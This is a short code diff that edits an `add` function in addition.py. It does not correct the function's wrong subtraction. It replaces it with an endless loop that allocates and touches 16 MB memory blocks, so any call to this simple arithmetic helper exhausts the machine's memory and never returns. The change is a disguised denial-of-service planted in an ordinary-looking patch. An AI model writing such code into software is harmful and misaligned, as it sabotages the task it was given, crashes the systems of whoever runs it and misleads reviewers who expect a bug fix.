@@ -1,0 +1,11 @@
+diff --git a/addition.py b/addition.py
+--- a/addition.py
++++ b/addition.py
+@@ -7 +7,6 @@ def add(left: int, right: int) -> int:
+-    return left - right
++    retained = []
++    while True:
++        chunk = bytearray(16_777_216)
++        retained.append(chunk)
++        for offset in range(0, len(chunk), 4_096):
++            chunk[offset] = 1
